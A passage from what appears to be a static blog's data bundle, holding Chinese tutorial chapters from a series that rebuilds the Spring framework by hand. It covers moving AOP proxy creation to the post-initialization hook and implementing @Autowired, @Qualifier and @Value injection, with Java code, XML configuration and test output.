// 转换为代理对象返回\n            AdvisedSupport advisedSupport = new AdvisedSupport();\n            advisedSupport.setTargetSource(new TargetSource(bean));\n            advisedSupport.setMethodMatcher(advisor.getPointcut().getMethodMatcher());\n            advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice());\n            advisedSupport.setProxyTargetClass(false); // 默认使用 cglib 代理\n            return new ProxyFactory(advisedSupport).getProxy();\n        }\n        return null;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n 2. TargetSource 改造\n\npublic class TargetSource {\n\n    private final Object target;\n\n    public TargetSource(Object target) {\n        this.target = target;\n    }\n\n    public Class<?>[] getTargetClass() {\n        Class<?> clazz = this.target.getClass();\n        clazz = ClassUtils.isCglibProxyClass(clazz) ? clazz.getSuperclass() : clazz;\n        return clazz.getInterfaces();\n    }\n\n    public Object getTarget() {\n        return target;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 将实现加入原有的逻辑中\n\n * AbstractAutowireCapableBeanFactory 创建 bean 流程改造\n\n    @Override\n    protected Object createBean(String beanName, BeanDefinition beanDefinition, Object[] args) throws BeansException {\n        Object bean = null;\n        try {\n            // 判断是否返回 代理 Bean 对象（注释原因，改用 BeanPostProcessor#postProcessAfterInitialization() 实现）\n            // bean = resolveBeforeInstantiation(beanName, beanDefinition);\n            // if (bean != null) {\n            //     return bean;\n            // }\n            \n            // 实例化\n            bean = createBeanInstance(beanName, beanDefinition, args);\n            \n            // 省略...\n            \n        } catch (Exception e) {\n            throw new BeansException("Failed to bean:[" + beanName + "] instance", e);\n        }\n        // 添加单例 Bean 缓存\n        if (beanDefinition.isSingleton()) {\n            // 注册实现了 DisposableBean 接口的 单例Bean 对象，留待容器停止的时候调用。\n            registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n            addSingleton(beanName, bean);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 测试\n\n * 配置文件，延用之前章节的 spring-advice.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    \x3c!--  目标类  --\x3e\n    <bean id="tiger" class="com.snail.springframework.beans.factory.bean.Tiger">\n        <property name="name" value="name-xml-init-wow!"></property>\n    </bean>\n\n    <bean class="com.snail.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"/>\n\n    \x3c!--  切面逻辑  --\x3e\n    <bean id="tigerAdvice" class="com.snail.springframework.aop.aspectj.TigerAdvice"/>\n    <bean id="methodInterceptor" class="com.snail.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor">\n        <property name="methodBeforeAdvice" ref="tigerAdvice"/>\n    </bean>\n\n    \x3c!--  切入点  --\x3e\n    <bean class="com.snail.springframework.aop.aspectj.AspectJExpressionPointcutAdvisor">\n        <property name="advice" ref="methodInterceptor"></property>\n        \x3c!--   cglib 代理     --\x3e\n        <property name="expression" value="execution(* com.snail.springframework.beans.factory.bean.Animal.*(..))"></property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n * 测试类，延用之前章节的 AspectJAopTest#aopSpringAdviceTest()。\n\npublic class AspectJAopTest {\n\n    /**\n     * aop 和 spring 整合测试\n     */\n    @Test\n    public void aopSpringAdviceTest() {\n        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("classpath:spring-advice.xml");\n        Animal proxy = (Animal) context.getBean("tiger");\n        // System.out.println("------------------" + DateUtil.now());\n        // proxy.setName("wow^^ hu~ Proxy");\n        System.out.println("------------------" + DateUtil.now());\n        // debug 查看是是否代理类：Tiger$$EnhancerByCGLIB$$ced6ff89@1860\n        System.out.println("proxy tiger name:" + proxy.getAnimalName());\n        System.out.println("------------------" + DateUtil.now());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n * 测试结果\n\n------------------2023-09-18 18:36:32\nTigerAdvice method before() -> method:getAnimalName(), args:null\nTigerAdvice method before() -> 前置aop, 进行一些操作, sleep(2000)\nproxy tiger name:name-xml-init-wow!\n------------------2023-09-18 18:36:34\n\n\n1\n2\n3\n4\n5\n\n\n\n# 代理对象的属性填充\n\n在我们实现的 Spring 中，bean 默认使用 cglib 来实例化的。\n\ncglib 通常用于在运行时生成Java类的子类。cglib 生成的子类会继承父类的私有属性和方法，但不会自动继承属性的值。属性值的初始化需要在子类中进行处理。\n\n而我们上章节已经在 bean 使用 cglib 实例化后，属性填充之前，利用 BeanPostProcessor 来修改属性值（解析@Value @Autowired等）。\n\n而现在将 代理对象 的创建，放在了 bean 实例化后，属性填充之后，初始化扩展的 BeanPostProcessor#postProcessAfterInitialization()，所以属性已经做了填充，代码无需改动。\n\n\n# 定义一些职责和能力\n\n 1. 无\n\n\n# 具体的实现\n\n 1. 无\n\n\n# 将实现加入原有的逻辑中\n\n 1. 无\n\n\n# 测试\n\n * xml 准备，无。\n\n * 提前准备，无。\n\n * 测试类，如上 AspectJAopTest#aopSpringAdviceTest()。\n\n * 测试结果，无。\n\n\n# 总结\n\n需要对 Spring 生命周期了解，及什么时候可以做哪些事情。\n\nSpring 框架中的 Bean 的生命周期包括以下阶段：\n\n 1. 实例化（Instantiation）：在这个阶段，Spring 容器根据 Bean 定义创建一个 Bean 的实例。这可以通过构造函数实例化、工厂方法或其他方式来完成。\n 2. 属性赋值（Populate Properties）：在 Bean 实例化后，Spring 容器会将配置的属性值和依赖注入到 Bean 中。这可以通过 XML 配置、Java 注解或 Java 配置来完成。\n 3. Bean 初始化前（Initialization Before）：在这个阶段，Spring 容器会调用 Bean 的初始化方法（如果有的话）。你可以自定义初始化方法，例如使用 @PostConstruct 注解。\n 4. Bean 初始化（Initialization）：在这个阶段，Spring 容器会调用 Bean 的初始化方法。这是 Bean 实际准备就绪的时候。\n 5. Bean 初始化后（Initialization After）：在这个阶段，Spring 容器会执行 Bean 初始化后的一些定制操作。你可以使用 BeanPostProcessor 接口来自定义这些操作。\n 6. Bean 可用（Bean Ready）：在上述阶段完成后，Bean 实例已经可以供应用程序使用了。\n 7. 销毁前（Destruction Before）：在 Bean 销毁之前，Spring 容器会调用 Bean 的销毁前方法（如果有的话）。你可以自定义销毁前方法，例如使用 @PreDestroy 注解。\n 8. 销毁（Destruction）：在这个阶段，Spring 容器会销毁 Bean 实例，释放资源。\n 9. 销毁后（Destruction After）：在 Bean 销毁后，Spring 容器会执行一些额外的清理操作。\n\n可以通过配置和自定义方法来干预和控制 Bean 的生命周期中的各个阶段。',normalizedContent:' * 解析\n * 改造代理对象的创建过程\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 代理对象的属性填充\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n改造 bean 的创建过程，将代理对象的创建由原先的 bean 实例化之前创建，改为 bean 实例化之后，在 beanpostprocessor 的初始化后置处理实现。\n\n\n# 改造代理对象的创建过程\n\n原先 aop 代理对象的创建是在 bean 实例化之前（defaultadvisorautoproxycreator#postprocessbeforeinstantiation()）创建的，现在改为在 beanpostprocessor 的初始化后置处理实现（defaultadvisorautoproxycreator#postprocessafterinitialization()）。\n\n在创建代理对象时，又由于最终会调用 targetsource#gettargetclass() 获取接口，所以改造为判断是 cglib 还是 jdk 的代理接口按需返回。\n\n\n# 定义一些职责和能力\n\n 1. 无\n\n\n# 具体的实现\n\n 1. defaultadvisorautoproxycreator 改造\n\npublic class defaultadvisorautoproxycreator implements instantiationawarebeanpostprocessor, beanfactoryaware {\n\n    private defaultlistablebeanfactory beanfactory;\n\n    @override\n    public void setbeanfactory(beanfactory beanfactory) {\n        this.beanfactory = (defaultlistablebeanfactory) beanfactory;\n    }\n\n    @override\n    public propertyvalues postprocesspropertyvalues(propertyvalues pvs, object bean, string beanname) {\n        return pvs;\n    }\n\n    @override\n    public object postprocessbeforeinstantiation(class<?> beanclass, string beanname) throws beansexception {\n        return null;\n    }\n\n    private boolean isinfrastructureclass(class<?> beanclass) {\n        return advice.class.isassignablefrom(beanclass) || pointcut.class.isassignablefrom(beanclass) || advisor.class.isassignablefrom(beanclass);\n    }\n\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) {\n        return bean;\n    }\n\n    @override\n    public object postprocessafterinitialization(object bean, string beanname) {\n        if (isinfrastructureclass(bean.getclass())) {\n            return null;\n        }\n\n        collection<aspectjexpressionpointcutadvisor> advisors = beanfactory.getbeansoftype(aspectjexpressionpointcutadvisor.class).values();\n        for (aspectjexpressionpointcutadvisor advisor : advisors) {\n            // 不匹配当前类，过滤\n            classfilter classfilter = advisor.getpointcut().getclassfilter();\n            if (classfilter != null && !classfilter.matches(bean.getclass())) {\n                continue;\n            }\n            // 转换为代理对象返回\n            advisedsupport advisedsupport = new advisedsupport();\n            advisedsupport.settargetsource(new targetsource(bean));\n            advisedsupport.setmethodmatcher(advisor.getpointcut().getmethodmatcher());\n            advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice());\n            advisedsupport.setproxytargetclass(false); // 默认使用 cglib 代理\n            return new proxyfactory(advisedsupport).getproxy();\n        }\n        return null;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n 2. targetsource 改造\n\npublic class targetsource {\n\n    private final object target;\n\n    public targetsource(object target) {\n        this.target = target;\n    }\n\n    public class<?>[] gettargetclass() {\n        class<?> clazz = this.target.getclass();\n        clazz = classutils.iscglibproxyclass(clazz) ? clazz.getsuperclass() : clazz;\n        return clazz.getinterfaces();\n    }\n\n    public object gettarget() {\n        return target;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 将实现加入原有的逻辑中\n\n * abstractautowirecapablebeanfactory 创建 bean 流程改造\n\n    @override\n    protected object createbean(string beanname, beandefinition beandefinition, object[] args) throws beansexception {\n        object bean = null;\n        try {\n            // 判断是否返回 代理 bean 对象（注释原因，改用 beanpostprocessor#postprocessafterinitialization() 实现）\n            // bean = resolvebeforeinstantiation(beanname, beandefinition);\n            // if (bean != null) {\n            //     return bean;\n            // }\n            \n            // 实例化\n            bean = createbeaninstance(beanname, beandefinition, args);\n            \n            // 省略...\n            \n        } catch (exception e) {\n            throw new beansexception("failed to bean:[" + beanname + "] instance", e);\n        }\n        // 添加单例 bean 缓存\n        if (beandefinition.issingleton()) {\n            // 注册实现了 disposablebean 接口的 单例bean 对象，留待容器停止的时候调用。\n            registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n            addsingleton(beanname, bean);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 测试\n\n * 配置文件，延用之前章节的 spring-advice.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    \x3c!--  目标类  --\x3e\n    <bean id="tiger" class="com.snail.springframework.beans.factory.bean.tiger">\n        <property name="name" value="name-xml-init-wow!"></property>\n    </bean>\n\n    <bean class="com.snail.springframework.aop.framework.autoproxy.defaultadvisorautoproxycreator"/>\n\n    \x3c!--  切面逻辑  --\x3e\n    <bean id="tigeradvice" class="com.snail.springframework.aop.aspectj.tigeradvice"/>\n    <bean id="methodinterceptor" class="com.snail.springframework.aop.framework.adapter.methodbeforeadviceinterceptor">\n        <property name="methodbeforeadvice" ref="tigeradvice"/>\n    </bean>\n\n    \x3c!--  切入点  --\x3e\n    <bean class="com.snail.springframework.aop.aspectj.aspectjexpressionpointcutadvisor">\n        <property name="advice" ref="methodinterceptor"></property>\n        \x3c!--   cglib 代理     --\x3e\n        <property name="expression" value="execution(* com.snail.springframework.beans.factory.bean.animal.*(..))"></property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n * 测试类，延用之前章节的 aspectjaoptest#aopspringadvicetest()。\n\npublic class aspectjaoptest {\n\n    /**\n     * aop 和 spring 整合测试\n     */\n    @test\n    public void aopspringadvicetest() {\n        classpathxmlapplicationcontext context = new classpathxmlapplicationcontext("classpath:spring-advice.xml");\n        animal proxy = (animal) context.getbean("tiger");\n        // system.out.println("------------------" + dateutil.now());\n        // proxy.setname("wow^^ hu~ proxy");\n        system.out.println("------------------" + dateutil.now());\n        // debug 查看是是否代理类：tiger$$enhancerbycglib$$ced6ff89@1860\n        system.out.println("proxy tiger name:" + proxy.getanimalname());\n        system.out.println("------------------" + dateutil.now());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n * 测试结果\n\n------------------2023-09-18 18:36:32\ntigeradvice method before() -> method:getanimalname(), args:null\ntigeradvice method before() -> 前置aop, 进行一些操作, sleep(2000)\nproxy tiger name:name-xml-init-wow!\n------------------2023-09-18 18:36:34\n\n\n1\n2\n3\n4\n5\n\n\n\n# 代理对象的属性填充\n\n在我们实现的 spring 中，bean 默认使用 cglib 来实例化的。\n\ncglib 通常用于在运行时生成java类的子类。cglib 生成的子类会继承父类的私有属性和方法，但不会自动继承属性的值。属性值的初始化需要在子类中进行处理。\n\n而我们上章节已经在 bean 使用 cglib 实例化后，属性填充之前，利用 beanpostprocessor 来修改属性值（解析@value @autowired等）。\n\n而现在将 代理对象 的创建，放在了 bean 实例化后，属性填充之后，初始化扩展的 beanpostprocessor#postprocessafterinitialization()，所以属性已经做了填充，代码无需改动。\n\n\n# 定义一些职责和能力\n\n 1. 无\n\n\n# 具体的实现\n\n 1. 无\n\n\n# 将实现加入原有的逻辑中\n\n 1. 无\n\n\n# 测试\n\n * xml 准备，无。\n\n * 提前准备，无。\n\n * 测试类，如上 aspectjaoptest#aopspringadvicetest()。\n\n * 测试结果，无。\n\n\n# 总结\n\n需要对 spring 生命周期了解，及什么时候可以做哪些事情。\n\nspring 框架中的 bean 的生命周期包括以下阶段：\n\n 1. 实例化（instantiation）：在这个阶段，spring 容器根据 bean 定义创建一个 bean 的实例。这可以通过构造函数实例化、工厂方法或其他方式来完成。\n 2. 属性赋值（populate properties）：在 bean 实例化后，spring 容器会将配置的属性值和依赖注入到 bean 中。这可以通过 xml 配置、java 注解或 java 配置来完成。\n 3. bean 初始化前（initialization before）：在这个阶段，spring 容器会调用 bean 的初始化方法（如果有的话）。你可以自定义初始化方法，例如使用 @postconstruct 注解。\n 4. bean 初始化（initialization）：在这个阶段，spring 容器会调用 bean 的初始化方法。这是 bean 实际准备就绪的时候。\n 5. bean 初始化后（initialization after）：在这个阶段，spring 容器会执行 bean 初始化后的一些定制操作。你可以使用 beanpostprocessor 接口来自定义这些操作。\n 6. bean 可用（bean ready）：在上述阶段完成后，bean 实例已经可以供应用程序使用了。\n 7. 销毁前（destruction before）：在 bean 销毁之前，spring 容器会调用 bean 的销毁前方法（如果有的话）。你可以自定义销毁前方法，例如使用 @predestroy 注解。\n 8. 销毁（destruction）：在这个阶段，spring 容器会销毁 bean 实例，释放资源。\n 9. 销毁后（destruction after）：在 bean 销毁后，spring 容器会执行一些额外的清理操作。\n\n可以通过配置和自定义方法来干预和控制 bean 的生命周期中的各个阶段。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 12 - 实现 @Autowired,@Qualifier,@Value",frontmatter:{title:"手写 Spring 12 - 实现 @Autowired,@Qualifier,@Value",date:"2024-01-04T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-12.html",relativePath:"views/backend/spring-source-12.md",key:"v-87d0453c",path:"/views/backend/spring-source-12.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:3},{level:2,title:"通过注解注入属性",slug:"通过注解注入属性",normalizedTitle:"通过注解注入属性",charIndex:9},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力",charIndex:23},{level:3,title:"具体的实现",slug:"具体的实现",normalizedTitle:"具体的实现",charIndex:38},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中",charIndex:49},{level:3,title:"测试",slug:"测试",normalizedTitle:"测试",charIndex:66},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:72}],excerpt:"<Boxx/>\n",headersStr:"解析 通过注解注入属性 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 总结",content:' * 解析\n * 通过注解注入属性\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n不妨先想一下，在 Spring 流程中的哪一步，可以实现通过注解给 bean 注入属性，或者说什么时候或者有哪个切入点可以支持我们修改。\n\n没错，在 bean 生命周期中 doGetBean() -> createBean()，有实例化，属性填充，初始化这么几步。\n\n改造流程肯定是在 实例化和属性填充之间，在设置 Bean 属性之前，允许通过 BeanPostProcessor 修改属性值。\n\n\n# 通过注解注入属性\n\n核心：在 bean 实例化之后，设置属性之前，允许通过 BeanPostProcessor 修改属性值。\n\n\n# 定义一些职责和能力\n\n 1. 修改 InstantiationAwareBeanPostProcessor，添加扩展点postProcessPropertyValues()。凡是实现这个接口方法的，都可以在 bean 实例化之后，设置属性之前，修改属性值。\n\n/**\n * InstantiationAwareBeanPostProcessor 接口的主要作用在于：目标对象的实例化过程中需要处理的事情，包括实例化对象的前后过程以及实例的属性设置\n */\npublic interface InstantiationAwareBeanPostProcessor extends BeanPostProcessor {\n\n    /**\n     * 后置处理属性值\n     *\n     * @param pvs      一个 bean 的所有字段及值\n     * @param bean     bean\n     * @param beanName bean名称\n     * @return {@link PropertyValues}\n     */\n    PropertyValues postProcessPropertyValues(PropertyValues pvs, Object bean, String beanName);\n\n    /**\n     * 在目标对象实例化之前调用，该方法的返回值类型是Object，我们可以返回任何类型的值。\n     * 由于这个时候目标对象还未实例化，所以这个返回值可以用来代替原本该生成的目标对象的实例(比如代理对象)。\n     * 如果该方法的返回值代替原本该生成的目标对象，后续只有postProcessAfterInitialization方法会调用，其它方法不再调用；否则按照正常的流程走。\n     */\n    Object postProcessBeforeInstantiation(Class<?> beanClass, String beanName) throws BeansException;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n 2. 相关属性注解\n\n@Target({ElementType.FIELD, ElementType.METHOD, ElementType.CONSTRUCTOR})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\npublic @interface Autowired {\n\n}\n\n@Target({ElementType.FIELD, ElementType.METHOD, ElementType.PARAMETER, ElementType.TYPE, ElementType.ANNOTATION_TYPE})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\npublic @interface Qualifier {\n\n    String value() default "";\n\n}\n\n@Target({ElementType.FIELD, ElementType.METHOD, ElementType.PARAMETER})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\npublic @interface Value {\n\n    /**\n     * The actual value expression: e.g. "${systemProperties.myProp}".\n     */\n    String value();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n 3. StringValueResolver，字符串解析器，实现这个接口的类都注入到容器中，方便解析 @Value 使用。\n\npublic interface StringValueResolver {\n\n    /**\n     * 解析字符串值\n     *\n     * @param value 要解析的字段的属性值\n     * @return {@link String} 替换后的值\n     */\n    String resolveStringValue(String value);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 4. 修改接口 ConfigurableBeanFactory，支持向容器中添加StringValueResolver，使容器支持解析属性值。\n\n/**\n * 扩展 BeanFactory 接口，支持设置父级容器、自自定义作用域、添加 Bean 后置处理器、设置 bean 的初始化和销毁回调方法等\n *\n * @author zhangpengjun\n * @date 2023/3/21\n */\npublic interface ConfigurableBeanFactory extends HierarchicalBeanFactory, SingletonBeanRegistry {\n\n    String SCOPE_SINGLETON = "singleton";\n    String SCOPE_PROTOTYPE = "prototype";\n\n    void addBeanPostProcessor(BeanPostProcessor beanPostProcessor);\n\n    /**\n     * 为嵌入式值（例如注释属性）添加字符串解析器\n     */\n    void addEmbeddedValueResolver(StringValueResolver valueResolver);\n\n    /**\n     * 解析给定的嵌入式值，例如一个注解属性\n     */\n    String resolveEmbeddedValue(String value);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 具体的实现\n\n 1. 修改 AbstractBeanFactory，使容器具备添加字符串解析器，和解析字符串表达式的能力。\n\npublic abstract class AbstractBeanFactory extends FactoryBeanRegistrySupport implements ConfigurableBeanFactory {\n\n    /**\n     * 字符串解析器，应用于注解属性值（替换@Value的值）\n     */\n    private final List<StringValueResolver> embeddedValueResolvers = new ArrayList<>();\n\n    @Override\n    public void addEmbeddedValueResolver(StringValueResolver valueResolver) {\n        this.embeddedValueResolvers.add(valueResolver);\n    }\n\n    @Override\n    public String resolveEmbeddedValue(String value) {\n        String result = value;\n        for (StringValueResolver resolver : this.embeddedValueResolvers) {\n            result = resolver.resolveStringValue(result);\n        }\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 2. PropertyPlaceholderConfigurer，StringValueResolver 的实现，支持属性值的解析。并向容器中添加字符串解析器，供容器具备解析 @Value 的能力。\n\n/**\n * bean对象 占位符处理 <br/>\n * 从给定的配置文件加载占位符的 key value。\n * 在 bean 实例化之前，替换 xml 配置的属性表达式。\n * 在 bean 实例化之后，属性赋值之前，替换 @Value 配置的属性表达式。\n *\n * @author zhangpengjun\n * @date 2023/9/13\n */\npublic class PropertyPlaceholderConfigurer implements BeanFactoryPostProcessor {\n\n    /**\n     * 默认占位符前缀\n     */\n    public static final String DEFAULT_PLACEHOLDER_PREFIX = "${";\n\n    /**\n     * 默认占位符后缀\n     */\n    public static final String DEFAULT_PLACEHOLDER_SUFFIX = "}";\n\n    private String location;\n\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n        // 加载属性文件\n        DefaultResourceLoader resourceLoader = new DefaultResourceLoader();\n        Properties properties = new Properties();\n        try {\n            properties.load(resourceLoader.getResource(location).getInputStream());\n        } catch (IOException e) {\n            throw new BeansException("Could not load properties", e);\n        }\n\n        // 遍历所有bean的属性值，符合规则的替换\n        String[] beanDefinitionNames = beanFactory.getBeanDefinitionNames();\n        for (String beanName : beanDefinitionNames) {\n            BeanDefinition beanDefinition = beanFactory.getBeanDefinition(beanName);\n            PropertyValues propertyValues = beanDefinition.getPropertyValues();\n            for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                Object value = propertyValue.getValue();\n                if (!(value instanceof String)) {\n                    continue;\n                }\n                String strValue = (String) value;\n                strValue = resolvePlaceholder(strValue, properties);\n                propertyValues.addPropertyValue(new PropertyValue(propertyValue.getName(), strValue));\n            }\n        }\n\n        // 向容器中添加字符串解析器，供解析@Value使用\n        StringValueResolver valueResolver = new PlaceholderResolvingStringValueResolver(properties);\n        beanFactory.addEmbeddedValueResolver(valueResolver);\n    }\n\n    private static String resolvePlaceholder(String strValue, Properties properties) {\n        StringBuilder builder = new StringBuilder(strValue);\n        int startIdx = strValue.indexOf(DEFAULT_PLACEHOLDER_PREFIX);\n        int stopIdx = strValue.indexOf(DEFAULT_PLACEHOLDER_SUFFIX);\n        if (startIdx != -1 && stopIdx != -1 && startIdx < stopIdx) {\n            String key = strValue.substring(startIdx + 2, stopIdx);\n            String val = properties.getProperty(key);\n            builder.replace(startIdx, stopIdx + 1, val);\n        }\n        return builder.toString();\n    }\n\n    public void setLocation(String location) {\n        this.location = location;\n    }\n\n    private static class PlaceholderResolvingStringValueResolver implements StringValueResolver {\n\n        private final Properties properties;\n\n        public PlaceholderResolvingStringValueResolver(Properties properties) {\n            this.properties = properties;\n        }\n\n        @Override\n        public String resolveStringValue(String value) {\n            return resolvePlaceholder(value, properties);\n        }\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n 3. AutowiredAnnotationBeanPostProcessor，InstantiationAwareBeanPostProcessor#postProcessPropertyValues() 的实现。处理 @Autowired @Value 等注解。\n\n/**\n * Spring 注解驱动的核心组件之一，处理的Bean 的依赖注入，处理的相关的注解有：@Autowired @Value\n *\n * @author zhangpengjun\n * @date 2023/9/15\n */\npublic class AutowiredAnnotationBeanPostProcessor implements InstantiationAwareBeanPostProcessor, BeanFactoryAware {\n\n    private ConfigurableListableBeanFactory beanFactory;\n\n    @Override\n    public void setBeanFactory(BeanFactory beanFactory) {\n        this.beanFactory = (ConfigurableListableBeanFactory) beanFactory;\n    }\n\n    @Override\n    public PropertyValues postProcessPropertyValues(PropertyValues pvs, Object bean, String beanName) {\n        Class<?> clazz = bean.getClass();\n        clazz = ClassUtils.isCglibProxyClass(clazz) ? clazz.getSuperclass() : clazz;\n\n        // 处理 @Value 注解\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for (Field field : declaredFields) {\n            Value valueAnnotation = field.getDeclaredAnnotation(Value.class);\n            if (valueAnnotation != null) {\n                String value = valueAnnotation.value();\n                value = beanFactory.resolveEmbeddedValue(value);\n                BeanUtil.setFieldValue(bean, field.getName(), value);\n            }\n        }\n\n        // 处理 @Autowired 注解\n        for (Field field : declaredFields) {\n            Autowired autowiredAnnotation = field.getAnnotation(Autowired.class);\n            if (autowiredAnnotation != null) {\n                Class<?> fieldType = field.getType();\n                Object dependentBean = null;\n                Qualifier qualifierAnnotation = field.getDeclaredAnnotation(Qualifier.class);\n                // 优先按照 @Qualifier 注入，再按照类型注入\n                if (qualifierAnnotation != null) {\n                    String dependentBeanName = qualifierAnnotation.value();\n                    dependentBean = beanFactory.getBean(dependentBeanName, fieldType);\n                } else {\n                    dependentBean = beanFactory.getBean(fieldType);\n                }\n                BeanUtil.setFieldValue(bean, field.getName(), dependentBean);\n            }\n        }\n\n        return pvs;\n    }\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) {\n        return bean;\n    }\n\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) {\n        return bean;\n    }\n\n    @Override\n    public Object postProcessBeforeInstantiation(Class<?> beanClass, String beanName) throws BeansException {\n        return null;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n\n# 将实现加入原有的逻辑中\n\n * 修改 AbstractAutowireCapableBeanFactory#createBean() 创建 bean 的过程，将逻辑加入原先实例化后，属性赋值之前。\n\npublic abstract class AbstractAutowireCapableBeanFactory extends AbstractBeanFactory implements AutowireCapableBeanFactory {\n\n    @Override\n    protected Object createBean(String beanName, BeanDefinition beanDefinition, Object[] args) throws BeansException {\n        Object bean = null;\n        try {\n            // 判断是否返回 代理 Bean 对象\n            bean = resolveBeforeInstantiation(beanName, beanDefinition);\n            if (bean != null) {\n                return bean;\n            }\n            // 实例化\n            bean = createBeanInstance(beanName, beanDefinition, args);\n            // 在设置 Bean 属性之前，允许 BeanPostProcessor 修改属性值（解析@Value @Autowired等）\n            applyBeanPostProcessorsBeforeApplyingPropertyValues(beanName, bean, beanDefinition);\n            // 属性填充\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // 添加 Bean 的初始化扩展\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Failed to bean:[" + beanName + "] instance", e);\n        }\n        // 添加单例 Bean 缓存\n        if (beanDefinition.isSingleton()) {\n            // 注册实现了 DisposableBean 接口的 单例Bean 对象，留待容器停止的时候调用。\n            